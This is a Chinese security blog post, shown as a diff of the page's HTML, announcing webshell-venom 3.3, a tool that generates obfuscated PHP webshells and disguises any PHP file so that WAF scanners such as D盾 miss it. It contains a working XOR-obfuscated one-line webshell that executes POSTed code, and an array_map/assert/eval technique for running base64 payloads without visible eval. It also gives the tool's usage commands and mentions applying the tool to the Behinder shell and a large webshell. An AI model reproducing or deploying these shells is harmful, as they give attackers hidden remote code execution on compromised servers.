@@ -1,0 +1,477 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>webshell-venom 3.3 :利用随机异或免杀任意php文件 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="webshell-venom 3.3 :利用随机异或免杀任意php文件" />
+<meta property="og:description" content="1 前言没想到这么快就800颗星了 这次算是一次比较重大的更新，具体情况请看下文。 2 webshell-venom 3.3 更新日志 代码结构优化，更清爽，方便自定义开发。 减小she" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/webshell-venom-3-3/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-09-03T20:33:07+00:00" />
+<meta property="article:modified_time" content="2019-09-03T20:33:07+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="webshell-venom 3.3 :利用随机异或免杀任意php文件"/>
+<meta name="twitter:description" content="1 前言没想到这么快就800颗星了 这次算是一次比较重大的更新，具体情况请看下文。 2 webshell-venom 3.3 更新日志 代码结构优化，更清爽，方便自定义开发。 减小she"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/webshell-venom-3-3/" /><link rel="prev" href="https://yzddmr6.com/posts/webcrack-1/" /><link rel="next" href="https://yzddmr6.com/posts/webcrack-release/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "webshell-venom 3.3 :利用随机异或免杀任意php文件",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/webshell-venom-3-3\/"
+        },"genre": "posts","keywords": "webshell-venom","wordcount":  1377 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/webshell-venom-3-3\/","datePublished": "2019-09-03T20:33:07+00:00","dateModified": "2019-09-03T20:33:07+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#webshell-venom-33-更新日志">webshell-venom 3.3 更新日志</a></li>
+    <li><a href="#1-结构优化">1. 结构优化</a></li>
+    <li><a href="#2-减小体积">2. 减小体积</a></li>
+    <li><a href="#3对任意php文件免杀">3.对任意php文件免杀</a>
+      <ul>
+        <li><a href="#首先区分免杀跟加密的区别">首先区分免杀跟加密的区别</a></li>
+        <li><a href="#任意文件免杀原理">任意文件免杀原理</a></li>
+        <li><a href="#如何调用">如何调用</a></li>
+        <li><a href="#解决办法">解决办法</a></li>
+      </ul>
+    </li>
+    <li><a href="#使用方法">使用方法</a></li>
+    <li><a href="#免杀冰蝎">免杀冰蝎</a></li>
+    <li><a href="#更多玩法">更多玩法</a></li>
+    <li><a href="#不足之处">不足之处</a></li>
+    <li><a href="#项目地址">项目地址</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">webshell-venom 3.3 :利用随机异或免杀任意php文件</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"><i class="far fa-folder fa-fw"></i>安全工具</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-09-03">2019-09-03</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-09-03">2019-09-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1377 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 3 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#webshell-venom-33-更新日志">webshell-venom 3.3 更新日志</a></li>
+    <li><a href="#1-结构优化">1. 结构优化</a></li>
+    <li><a href="#2-减小体积">2. 减小体积</a></li>
+    <li><a href="#3对任意php文件免杀">3.对任意php文件免杀</a>
+      <ul>
+        <li><a href="#首先区分免杀跟加密的区别">首先区分免杀跟加密的区别</a></li>
+        <li><a href="#任意文件免杀原理">任意文件免杀原理</a></li>
+        <li><a href="#如何调用">如何调用</a></li>
+        <li><a href="#解决办法">解决办法</a></li>
+      </ul>
+    </li>
+    <li><a href="#使用方法">使用方法</a></li>
+    <li><a href="#免杀冰蝎">免杀冰蝎</a></li>
+    <li><a href="#更多玩法">更多玩法</a></li>
+    <li><a href="#不足之处">不足之处</a></li>
+    <li><a href="#项目地址">项目地址</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>没想到这么快就800颗星了</p>
+<p>这次算是一次比较重大的更新，具体情况请看下文。</p>
+<h2 id="webshell-venom-33-更新日志" class="headerLink">
+    <a href="#webshell-venom-33-%e6%9b%b4%e6%96%b0%e6%97%a5%e5%bf%97" class="header-mark"></a>2 webshell-venom 3.3 更新日志</h2><ol>
+<li>
+<p>代码结构优化，更清爽，方便自定义开发。</p>
+</li>
+<li>
+<p>减小shell体积。</p>
+</li>
+<li>
+<p>增加利用随机异或免杀任意php文件功能。</p>
+</li>
+</ol>
+<h2 id="1-结构优化" class="headerLink">
+    <a href="#1-%e7%bb%93%e6%9e%84%e4%bc%98%e5%8c%96" class="header-mark"></a>3 1. 结构优化</h2><p>先上图吧</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435455-074170ad-2234-4ca3-b748-bb200b5716d3.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435455-074170ad-2234-4ca3-b748-bb200b5716d3.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435455-074170ad-2234-4ca3-b748-bb200b5716d3.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435455-074170ad-2234-4ca3-b748-bb200b5716d3.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435455-074170ad-2234-4ca3-b748-bb200b5716d3.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435455-074170ad-2234-4ca3-b748-bb200b5716d3.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>原来因为随手写的脚本，代码其实比较乱</p>
+<p>这次整个重构了一遍，把随机的变量名随机字符串给标注了出来</p>
+<p>shell结构一目了然，方便大家自己二次开发。</p>
+<p>当然结构写的清爽也带来一些问题</p>
+<p>比如说厂商写查杀正则的时候更方便了。。。</p>
+<p>不过就像我一直强调的</p>
+<p><strong>重要的从来不是脚本，而是思路</strong></p>
+<p>只靠我一个人更新肯定是不行的</p>
+<p>我在脚本里提供了很多公共函数，自己稍微修改一下就可以bypass。</p>
+<h2 id="2-减小体积" class="headerLink">
+    <a href="#2-%e5%87%8f%e5%b0%8f%e4%bd%93%e7%a7%af" class="header-mark"></a>4 2. 减小体积</h2><p>这个自己生成一下就能看得到，不讲了。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">class QCON{
+</span></span><span class="line"><span class="cl">    function __destruct(){
+</span></span><span class="line"><span class="cl">        $ARIK=&#39;cnP*lm&#39;^&#34;\x2\x1d\x23\x4f\x1e\x19&#34;;
+</span></span><span class="line"><span class="cl">        return @$ARIK(&#34;$this-&gt;DGBO&#34;);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$qcon=new QCON();
+</span></span><span class="line"><span class="cl">@$qcon-&gt;DGBO=isset($_GET[&#39;id&#39;])?base64_decode($_POST[&#39;mr6&#39;]):$_POST[&#39;mr6&#39;];
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="3对任意php文件免杀" class="headerLink">
+    <a href="#3%e5%af%b9%e4%bb%bb%e6%84%8fphp%e6%96%87%e4%bb%b6%e5%85%8d%e6%9d%80" class="header-mark"></a>5 3.对任意php文件免杀</h2><p>这个是本文的重点，也是这次更新的重要部分，着重讲一下吧。</p>
+<h3 id="首先区分免杀跟加密的区别" class="headerLink">
+    <a href="#%e9%a6%96%e5%85%88%e5%8c%ba%e5%88%86%e5%85%8d%e6%9d%80%e8%b7%9f%e5%8a%a0%e5%af%86%e7%9a%84%e5%8c%ba%e5%88%ab" class="header-mark"></a>5.1 首先区分免杀跟加密的区别</h3><ul>
+<li>
+<p>加密就是让别人看不到源码</p>
+</li>
+<li>
+<p>免杀是绕过waf的检测，使其无法识别为木马</p>
+</li>
+<li>
+<p>单纯加密不一定可以免杀，但是免杀少不了加密</p>
+</li>
+</ul>
+<p>单纯加密的话百度搜一下php在线加密，一大堆网站</p>
+<p>但是用过的都知道加密之后虽然谁都不认得了，但是D盾会报二级加密脚本</p>
+<p>二级肯定不是咱们的目的，所以就要做0级的免杀。</p>
+<h3 id="任意文件免杀原理" class="headerLink">
+    <a href="#%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%85%8d%e6%9d%80%e5%8e%9f%e7%90%86" class="header-mark"></a>5.2 任意文件免杀原理</h3><p>首先大家要知道一点:</p>
+<p><strong>随便一个被D盾杀的妈都不认的shell，base64或者hex等编码后waf都不认得</strong></p>
+<p>所以思路就是：</p>
+<p>先把原来的payload，给处理一遍</p>
+<p>然后通过函数调用来解密并执行payload</p>
+<h3 id="如何调用" class="headerLink">
+    <a href="#%e5%a6%82%e4%bd%95%e8%b0%83%e7%94%a8" class="header-mark"></a>5.3 如何调用</h3><p>处理的话脚本中就是用的base64</p>
+<p>那么如何调用呢</p>
+<p>其实如果用eval的话很好写，随便改一下就免杀了</p>
+<p>但是eval是一种语言结构不是函数，也就是不能像assert一样拆分就很难受</p>
+<p>自己有点强迫症，shell中不能出现eval等关键字，不然会被最简单的字符串搜索查找到shell</p>
+<p>所以就想到了assert</p>
+<p>但是问题来了，assert不能执行多句</p>
+<p>也就是说</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">assert(echo 1; echo 2; ); //差不多这个意思。。。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后只回显一个1，也就是只执行第一句话。</p>
+<p>但是所要免杀的php文件肯定不止一句话</p>
+<p>所以一般assert就要配合eval使用</p>
+<p>也就是<code>assert(eval(xxx;xxx;xxx;));</code>这种</p>
+<p>还是有eval，那我还用个鸡儿的assert。。。</p>
+<h3 id="解决办法" class="headerLink">
+    <a href="#%e8%a7%a3%e5%86%b3%e5%8a%9e%e6%b3%95" class="header-mark"></a>5.4 解决办法</h3><p>研究了一下，发现利用array_map+assert+eval</p>
+<p>加个数组处理就可以把eval给拆分掉了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">array_map(&#39;u?ldOQ&#39;^&#34;\x14\x4c\x1f\x1\x3d\x25&#34;,array((&#39;P/f}&#39;^&#34;\x35\x59\x7\x11&#34;).&#34;(base64_decode(&#39;xxxxxxxx&#39;));&#34;));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上面的两个异或的字符串分别是assert跟eval</p>
+<p>哈，然后放在类里调用一下就免杀了。</p>
+<h2 id="使用方法" class="headerLink">
+    <a href="#%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95" class="header-mark"></a>6 使用方法</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 php-venom-3.3.py    #生成免杀一句话
+</span></span><span class="line"><span class="cl">python3 php-venom-3.3.py shell.php   # 对同目录下shell.php进行免杀处理，保存在shell.php.bypass.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435556-df46a525-c961-4926-80af-bb7b6500ae47.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435556-df46a525-c961-4926-80af-bb7b6500ae47.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435556-df46a525-c961-4926-80af-bb7b6500ae47.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435556-df46a525-c961-4926-80af-bb7b6500ae47.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435556-df46a525-c961-4926-80af-bb7b6500ae47.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435556-df46a525-c961-4926-80af-bb7b6500ae47.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435643-60c1e71f-88d8-40f2-bbfa-5876ad3b6619.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435643-60c1e71f-88d8-40f2-bbfa-5876ad3b6619.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435643-60c1e71f-88d8-40f2-bbfa-5876ad3b6619.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435643-60c1e71f-88d8-40f2-bbfa-5876ad3b6619.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435643-60c1e71f-88d8-40f2-bbfa-5876ad3b6619.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435643-60c1e71f-88d8-40f2-bbfa-5876ad3b6619.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435736-5fc5eb65-b20e-4bec-8766-0f164daeff62.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435736-5fc5eb65-b20e-4bec-8766-0f164daeff62.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435736-5fc5eb65-b20e-4bec-8766-0f164daeff62.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435736-5fc5eb65-b20e-4bec-8766-0f164daeff62.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435736-5fc5eb65-b20e-4bec-8766-0f164daeff62.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435736-5fc5eb65-b20e-4bec-8766-0f164daeff62.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="免杀冰蝎" class="headerLink">
+    <a href="#%e5%85%8d%e6%9d%80%e5%86%b0%e8%9d%8e" class="header-mark"></a>7 免杀冰蝎</h2><p>举个栗子，就免杀冰蝎吧。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435834-9d08cb0d-1f1e-48a7-a9f1-c9d618c3647b.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435834-9d08cb0d-1f1e-48a7-a9f1-c9d618c3647b.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435834-9d08cb0d-1f1e-48a7-a9f1-c9d618c3647b.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435834-9d08cb0d-1f1e-48a7-a9f1-c9d618c3647b.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435834-9d08cb0d-1f1e-48a7-a9f1-c9d618c3647b.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435834-9d08cb0d-1f1e-48a7-a9f1-c9d618c3647b.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="更多玩法" class="headerLink">
+    <a href="#%e6%9b%b4%e5%a4%9a%e7%8e%a9%e6%b3%95" class="header-mark"></a>8 更多玩法</h2><p>还可以免杀我上次发的自己二次开发的大马</p>
+<p>大马地址：</p>
+<p><a href="https://github.com/yzddmr6/BestShell" target="_blank" rel="noopener noreferrer">https://github.com/yzddmr6/BestShell</a></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435960-19eb6d04-092e-4416-9db4-7cfdd5d90e8f.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435960-19eb6d04-092e-4416-9db4-7cfdd5d90e8f.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435960-19eb6d04-092e-4416-9db4-7cfdd5d90e8f.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435960-19eb6d04-092e-4416-9db4-7cfdd5d90e8f.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435960-19eb6d04-092e-4416-9db4-7cfdd5d90e8f.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900435960-19eb6d04-092e-4416-9db4-7cfdd5d90e8f.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>200kb好像有点大。。。</p>
+<p>想减小体积的话自己加个gzin压缩吧</p>
+<p>免杀后的demo已经放到大马项目里了</p>
+<h2 id="不足之处" class="headerLink">
+    <a href="#%e4%b8%8d%e8%b6%b3%e4%b9%8b%e5%a4%84" class="header-mark"></a>9 不足之处</h2><p>python的base64函数有点傻逼，不会自己检测源文件的编码方式php是世界上最好的语言</p>
+<p>我在脚本里用了 chardet 模块来探测可能的编码</p>
+<p>但是用了一下发现不能做到百分百正确识别</p>
+<p>utf8的没问题，遇到其他编码就容易乱码</p>
+<p>如果gbk乱码的话就自己手工base64一遍替换payload吧</p>
+<h2 id="项目地址" class="headerLink">
+    <a href="#%e9%a1%b9%e7%9b%ae%e5%9c%b0%e5%9d%80" class="header-mark"></a>10 项目地址</h2><p><a href="https://github.com/yzddmr6/webshell-venom" target="_blank" rel="noopener noreferrer">https://github.com/yzddmr6/webshell-venom</a></p>
+</div>
+
+        
+
+
+<h2>相关内容</h2>
+<div class="related-container">
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/webshell-venom/">一键吊打D盾(免杀一句话无限生成)</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/webshell-venom-aspx/">无限免杀D盾脚本之aspx</a>
+            </h2>
+        </div>
+    <div class="related-item-container">
+            <h2 class="related-title">
+                <a href="/posts/webshell-venom-1-0/">利用随机异或无限免杀d盾</a>
+            </h2>
+        </div>
+    
+
+</div>
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2019-09-03</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/webshell-venom-3-3/" data-title="webshell-venom 3.3 :利用随机异或免杀任意php文件" data-hashtags="webshell-venom"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/webshell-venom-3-3/" data-hashtag="webshell-venom"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/webshell-venom-3-3/" data-title="webshell-venom 3.3 :利用随机异或免杀任意php文件"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/webshell-venom-3-3/" data-title="webshell-venom 3.3 :利用随机异或免杀任意php文件"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/webshell-venom-3-3/" data-title="webshell-venom 3.3 :利用随机异或免杀任意php文件"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/webshell-venom-3-3/" data-title="webshell-venom 3.3 :利用随机异或免杀任意php文件" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
